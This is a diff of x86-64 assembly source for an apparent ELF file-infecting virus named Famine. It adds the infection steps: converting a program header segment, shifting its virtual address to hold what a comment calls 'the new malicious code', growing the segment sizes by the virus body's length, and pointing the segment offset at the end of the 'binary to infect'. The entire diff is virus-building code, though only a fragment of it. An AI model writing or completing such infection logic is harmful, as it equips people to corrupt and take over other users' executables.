@@ -13,6 +13,7 @@
 %define S_IFDIR 0x4000
 %define O_RDONLY 00
 %define S_IFMT 0xf000
+%define SEEK_END	2
 
 %define FAMINE_STACK_SIZE 5000
 %define DIRENT_BUFFSIZE 1024
@@ -75,6 +76,8 @@
 ;	r15 + 1472    phdr.p_align                      Alignment of the segment in memory and file.
 
 ; r15 + 1484                                        phdr_num counter to iterate over the headers
+
+; r15 + 1500                                        binary to infect size
 
 global _start
 
@@ -216,10 +219,25 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		_change_mem_protections:
 			mov dword [r15 + 1428], PF_R | PF_X    ; disable memory protections
 
-		@ _adjust_mem_vaddr:
-		@ 	mov r9, [r15 + 80]					   ; copy stat.st_size to aux registry
-		@ 	add r9, 0xc000000					   ; add enough memory to account for the new malicious code
-		@ 	mov [r15 + 1440], r9				   ; patch phdr.vaddr
+		_adjust_mem_vaddr:
+		 	mov r9, [r15 + 80]					   ; copy stat.st_size to aux registry
+		 	add r9, 0xc000000					   ; add enough memory to account for the new malicious code
+		 	mov [r15 + 1440], r9				   ; patch phdr.vaddr
+
+
+		_patch_segment_size:
+			add qword [r15 + 1456], _stop - _start + 5;
+			add qword [r15 + 1464], _stop - _start + 5;
+
+		_point_offset_to_converted_segment:
+			mov rax, SYS_LSEEK
+			mov rdi, [r15 + 1420]
+			mov rsi, 0
+			mov rdx, SEEK_END
+			syscall
+ 
+			mov [r15 + 1432], rax
+
 
 		_write_header_changes_to_bin:              ; writes new header modifications to the binary
 			mov rdi, [r15 + 1420]
@@ -255,6 +273,7 @@ _end:
 	add rsp, FAMINE_STACK_SIZE
 	pop rsp
 	pop rdx
+_stop:
 	mov rax, SYS_EXIT
 	xor rdi, rdi
 	syscall
